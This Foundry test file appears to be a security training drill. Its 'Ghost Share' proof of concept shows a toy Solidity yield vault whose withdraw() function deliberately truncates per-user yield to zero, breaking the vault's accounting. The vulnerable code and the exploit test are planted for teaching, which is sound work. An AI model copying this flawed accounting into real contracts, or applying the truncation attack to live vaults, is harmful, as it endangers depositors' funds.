// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/**
 * DRILL 10 PoC - THE GHOST SHARE
 * Bug: withdraw() integer truncation: userYield can = 0 → totalDeposits
 * over-reduced but totalYield unchanged → accounting break + profit for next user.
 */

contract YieldVault {
    uint256 public totalShares;
    uint256 public totalDeposits;
    uint256 public totalYield;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public yieldCheckpoint;
    uint256 public yieldPerShare;
    uint256 private lastYieldUpdate;
    uint256 public yieldRate = 1e12;

    function _accrueYield() internal {
        if (totalDeposits == 0) { lastYieldUpdate = block.timestamp; return; }
        uint256 elapsed = block.timestamp - lastYieldUpdate;
        if (elapsed == 0) return;
        uint256 newYield = totalDeposits * yieldRate * elapsed / 1e18;
        totalYield += newYield;
        yieldPerShare += newYield * 1e18 / totalShares;
        lastYieldUpdate = block.timestamp;
    }

    function deposit(uint256 assets) external returns (uint256 sharesOut) {
        _accrueYield();
        require(assets > 0, "zero");
        uint256 currentAssets = totalDeposits + totalYield;
        if (totalShares == 0) { sharesOut = assets; }
        else { sharesOut = assets * totalShares / currentAssets; }

        totalShares += sharesOut;
        totalDeposits += assets;
        shares[msg.sender] += sharesOut;
        yieldCheckpoint[msg.sender] = yieldPerShare;
    }

    function withdraw(uint256 sharesIn) external returns (uint256 assetsOut) {
        _accrueYield();
        require(sharesIn > 0 && sharesIn <= shares[msg.sender], "bad");
        uint256 currentAssets = totalDeposits + totalYield;
        assetsOut = sharesIn * currentAssets / totalShares;

        // *** THE BUG: userYield truncates to 0 if checkpoint is close to YPS ***
        uint256 userYield = sharesIn * (yieldPerShare - yieldCheckpoint[msg.sender]) / 1e18;

        shares[msg.sender] -= sharesIn;
        totalShares -= sharesIn;

        uint256 principalPortion = assetsOut > userYield ? assetsOut - userYield : 0;
        totalDeposits -= principalPortion;
        totalYield -= userYield;

        yieldCheckpoint[msg.sender] = yieldPerShare;
    }
}

contract Drill10PoC is Test {
    YieldVault vault;
    address alice = address(0xA11CE);
    address bob   = address(0xB0B);

    function setUp() public {
        vault = new YieldVault();
    }

    function test_PoC_GhostShare_AccountingBreak() public {
        // Alice deposits 1000 (gets 1000 shares, 1:1)
        vm.prank(alice);
        uint256 aliceShares = vault.deposit(1000e18);
        assertEq(aliceShares, 1000e18);

        // Warp 999 seconds - yield accrues but per-share increment < 1 wei
        vm.warp(999);

        // Alice withdraws 1 share
        // userYield = 1 * (yieldPerShare_delta) / 1e18
        // yieldPerShare_delta = totalDeposits * yieldRate * 999 / 1e18 * 1e18 / totalShares
        //   = 1000e18 * 1e12 * 999 / 1e18 = 999e15 ≈ 0.999e18
        //   but divide by totalShares=1000e18 → 0.000999e18 per share
        // userYield = 1 * 0.000999e18 / 1e18 = 0 (TRUNCATION!)
        uint256 beforeTA = vault.totalDeposits() + vault.totalYield();
        vm.prank(alice);
        uint256 assetsOut = vault.withdraw(1);
        assertEq(assetsOut, 1, "withdraw 1 share => 1 wei (no visible yield)");

        // userYield = 0 due to truncation
        // principalPortion = 1 - 0 = 1 (FULL amount as principal!)
        // totalDeposits -= 1; totalYield stays same
        // The yield that SHOULD have been withdrawn is now stuck in totalYield
        assertEq(vault.totalDeposits(), 1000e18 - 1, "totalDeposits reduced by full amount");
        assertEq(vault.totalYield(), 998_000_000_000_000_000, "totalYield unchanged - yield orphaned in accounting");

        console.log("[PoC - Drill 10] Ghost Share: MEDIUM");
        console.log("  alice withdraw(1 share) -> assets:", assetsOut);
        console.log("  userYield truncated: 0 (should be >0)");
        console.log("  totalYield unchanged: yield portion stuck in accounting");
    }
}
